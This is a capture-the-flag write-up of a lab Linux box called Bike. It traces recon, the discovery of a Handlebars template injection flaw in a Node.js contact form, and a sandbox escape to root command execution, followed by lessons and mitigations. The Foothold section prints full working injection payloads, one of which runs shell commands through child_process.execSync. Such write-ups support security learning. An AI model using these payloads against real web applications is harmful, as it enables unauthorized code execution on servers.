# Bike | Very Easy | 2026-07-07

## Summary
Bike is a Linux box running a Node.js web application on port 80. The contact form was vulnerable to Server-Side Template Injection (SSTI) via the email field, using the Handlebars templating engine. Initial SSTI confirmation was achieved with a basic payload, but the Handlebars sandbox blocked direct use of Node's require() function. A sandbox escape payload accessed child_process through global.process.mainModule.constructor._load(), achieving Remote Code Execution (RCE) and reading the flag from /root/flag.txt.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know input fields could execute server-side code | SSTI occurs when user input is passed into a template engine without sanitization -- the engine evaluates it as code rather than plain text |
| Didn't know Handlebars blocked require() | Handlebars runs templates in a sandbox that explicitly blocks direct require() calls -- confirmed by ReferenceError: require is not defined |
| Didn't know how to bypass the sandbox | Accessing the Function constructor via string prototype chain and loading child_process through global.process.mainModule.constructor._load bypasses the sandbox |

---

## Recon
- **Nmap command:** `nmap -p- --min-rate 5000 -T4 10.129.x.x` then `nmap -sV -sC -p 80 10.129.x.x`
- **Open ports / services found:**
  - `80` -- HTTP (Node.js web application)
- **Interesting observations:** Single page web app with a contact/email form -- input reflected back in the response, indicating potential SSTI

---

## Enumeration

### Web application
- Browsed to `http://10.129.x.x`
- Found a contact form with an email input field
- Submitted test input -- noticed input was reflected back in the response
- Identified reflection as a potential SSTI vector

### Burp Suite setup
- Launched Burp Suite Community Edition (pre-installed on Kali)
- Configured Firefox to proxy through `127.0.0.1:8080` via FoxyProxy
- Intercepted POST request from email form submission
- Sent to Repeater for payload testing

### SSTI confirmation
```
email=%7B%7B7*7%7D%7D&action=Submit
```
- `{{7*7}}` URL encoded and submitted via Burp Repeater
- Server returned error rather than `49` -- confirmed template engine processing input
- Error revealed Handlebars as the templating engine

---

## Foothold
- **Vulnerability:** Server-Side Template Injection (SSTI) in email form field -- OWASP A03:2021 Injection
- **CVE:** N/A -- misconfiguration/insecure coding practice
- **Exact commands:**

Step 1 -- confirm SSTI and identify engine:
```
email={{7*7}}&action=Submit
```

Step 2 -- attempt standard payload (blocked by sandbox):
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
Result: ReferenceError: require is not defined -- sandbox confirmed

Step 3 -- sandbox escape payload using global.process (working payload):
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('cat /root/flag.txt').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- URL encode full payload in Burp Decoder
- Paste as email parameter in Burp Repeater
- Send -- flag returned in response

- **Why it worked:** The Handlebars sandbox blocked require() directly but did not block access to global.process.mainModule.constructor._load(), an alternative path to Node's module loader. The #with block chain accessed the Function constructor via string prototype, constructed a new function containing the exploit code, and executed it synchronously via execSync() -- returning command output directly in the HTTP response.

---

## Privilege Escalation
- N/A -- RCE executed as root, flag read directly from /root/flag.txt

---

## Tools Used
- nmap
- Burp Suite (Proxy, Repeater, Decoder)
- FoxyProxy (Firefox extension)

## Resources
- HackTricks SSTI Handlebars section: https://book.hacktricks.xyz

---

## Key Takeaways
- **SSTI testing** -- submit {{7*7}} in any input field that reflects output back. If the server returns 49 instead of the literal string, the template engine is evaluating user input
- **Handlebars sandbox** -- blocks require() directly, confirmed by ReferenceError. Always check HackTricks for engine-specific sandbox escapes when the standard payload fails
- **global.process.mainModule.constructor._load** -- alternative to require() that bypasses the Handlebars sandbox, accesses the same Node module loader through a different path
- **execSync vs exec** -- exec is async, output doesn't appear in HTTP response. execSync is synchronous and returns output directly -- essential for SSTI RCE where you need to see command output in the response
- **Burp Decoder for URL encoding** -- payloads containing special characters must be URL encoded before submission. Always verify the encoded string starts with %7B%7B (which is {{)
- **HackTricks** -- primary reference for engine-specific payloads and sandbox escapes. Search the templating engine name + SSTI for targeted payloads
- **What would have stopped this:**
  - Sanitize and validate all user input before passing to template engine
  - Never render user input directly inside template expressions
  - Use a Content Security Policy (CSP)
  - Run Node.js process as a low-privilege user rather than root

---

## Index Entry
| Box | Difficulty | Key Technique | CVE | Date |
|-----|------------|---------------|-----|------|
| Bike | Very Easy | SSTI Handlebars sandbox escape = RCE | N/A | 2026-07-07 |